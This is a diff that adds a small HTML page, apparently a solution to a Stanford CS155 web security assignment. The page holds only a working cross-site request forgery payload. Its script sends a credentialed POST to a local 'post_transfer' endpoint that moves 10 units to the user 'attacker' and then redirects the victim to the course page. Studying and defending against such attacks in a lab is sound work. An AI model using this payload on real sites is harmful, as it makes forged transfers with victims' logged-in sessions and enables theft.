@@ -1,0 +1,19 @@
+<meta charset="utf-8"/>
+<!DOCTYPE html>
+<html>
+<body>
+<script type="text/javascript">
+    var xmlhttp = new XMLHttpRequest();
+    var params = "destination_username=attacker&quantity=10"
+    xmlhttp.open('POST', 'http://localhost:3000/post_transfer');
+    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xmlhttp.onload = function(){
+    	window.location.replace("http://crypto.stanford.edu/cs155/");
+    }
+    xmlhttp.withCredentials = true;
+    xmlhttp.send(params);
+</script>
+</body>
+</html>
+
+  
